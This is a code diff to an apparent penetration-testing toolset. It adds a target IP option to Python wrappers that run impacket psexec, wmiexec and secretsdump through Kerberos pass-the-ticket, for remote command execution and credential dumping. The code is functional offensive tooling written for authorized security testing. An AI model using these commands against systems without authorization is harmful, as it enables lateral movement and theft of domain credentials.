@@ -390,6 +390,7 @@ class LateralMovementTools(Toolset):
         ticket_path: str | None = None,
         command: str = "cmd.exe /c whoami && hostname",
         dc_ip: str | None = None,
+        target_ip: str | None = None,
     ) -> str:
         """
         Execute command via PsExec using Kerberos ticket (pass-the-ticket).
@@ -404,6 +405,7 @@ class LateralMovementTools(Toolset):
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami && hostname)
             dc_ip: Domain controller IP for Kerberos (optional)
+            target_ip: Target IP address to connect to (overrides DNS resolution)
 
         Returns:
             Command output or error message
@@ -425,6 +427,8 @@ class LateralMovementTools(Toolset):
         cmd = ["impacket-psexec", "-k", "-no-pass", target_string]
         if dc_ip:
             cmd.extend(["-dc-ip", dc_ip])
+        if target_ip:
+            cmd.extend(["-target-ip", target_ip])
         cmd.extend(["-c", command])
 
         # Prepend KRB5CCNAME environment variable
@@ -453,6 +457,7 @@ class LateralMovementTools(Toolset):
         ticket_path: str | None = None,
         command: str = "whoami",
         dc_ip: str | None = None,
+        target_ip: str | None = None,
     ) -> str:
         """
         Execute command via WMI using Kerberos ticket (pass-the-ticket).
@@ -467,6 +472,7 @@ class LateralMovementTools(Toolset):
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami)
             dc_ip: Domain controller IP for Kerberos (optional)
+            target_ip: Target IP address to connect to (overrides DNS resolution)
 
         Returns:
             Command output or error message
@@ -487,6 +493,8 @@ class LateralMovementTools(Toolset):
         cmd = ["impacket-wmiexec", "-k", "-no-pass", target_string]
         if dc_ip:
             cmd.extend(["-dc-ip", dc_ip])
+        if target_ip:
+            cmd.extend(["-target-ip", target_ip])
         cmd.append(command)
 
         # Prepend KRB5CCNAME environment variable
@@ -576,6 +584,7 @@ class LateralMovementTools(Toolset):
         domain: str,
         ticket_path: str | None = None,
         dc_ip: str | None = None,
+        target_ip: str | None = None,
         timeout_minutes: int = 5,
     ) -> str:
         """
@@ -591,6 +600,7 @@ class LateralMovementTools(Toolset):
             domain: Domain name (e.g., 'domain.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             dc_ip: Domain controller IP for Kerberos (optional)
+            target_ip: Target IP address to connect to (overrides DNS resolution)
             timeout_minutes: Maximum time for dumping (default: 5)
 
         Returns:
@@ -613,6 +623,8 @@ class LateralMovementTools(Toolset):
         cmd = ["impacket-secretsdump", "-k", "-no-pass", target_string]
         if dc_ip:
             cmd.extend(["-dc-ip", dc_ip])
+        if target_ip:
+            cmd.extend(["-target-ip", target_ip])
 
         # Prepend KRB5CCNAME environment variable
         cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd
